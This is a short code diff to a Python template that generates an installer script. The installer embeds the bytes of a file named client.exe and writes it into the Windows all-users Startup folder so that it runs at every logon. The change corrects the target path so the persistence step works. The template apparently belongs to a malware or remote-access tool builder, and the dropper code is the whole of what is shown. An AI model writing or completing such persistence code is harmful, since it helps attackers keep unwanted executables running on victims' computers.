@@ -2,7 +2,7 @@ script=f"""import time
 
 if __name__=='__main__':
     try:
-        startup_path="C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp"
+        startup_path="C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/client.exe"
         payload={open("client.exe","rb").read()}
         open(startup_path,"wb").write(payload)
         print("Installed")
